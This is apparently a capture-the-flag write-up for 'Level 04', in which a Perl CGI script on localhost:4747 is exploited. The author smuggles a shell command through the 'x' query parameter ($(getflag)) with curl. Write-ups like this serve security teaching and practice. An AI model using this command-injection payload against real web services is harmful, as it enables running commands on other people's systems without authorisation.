# Level 04

## Check what is available at level launch
```bash
ls -la
# perl file appears
```

## Read Perl file
```bash
cat level04.pl

./level04.pl
```
We see it's a script written in Perl language.  
We can make a request using `curl` and the only parameter we can change is the value of 'x'.
So we need to change the value of 'x' so that it calls the `getflag` function and retrieves the password for us.  
We can inject a command directly through the terminal command line.

```bash
curl 'localhost:4747/?x=$(getflag)'
```
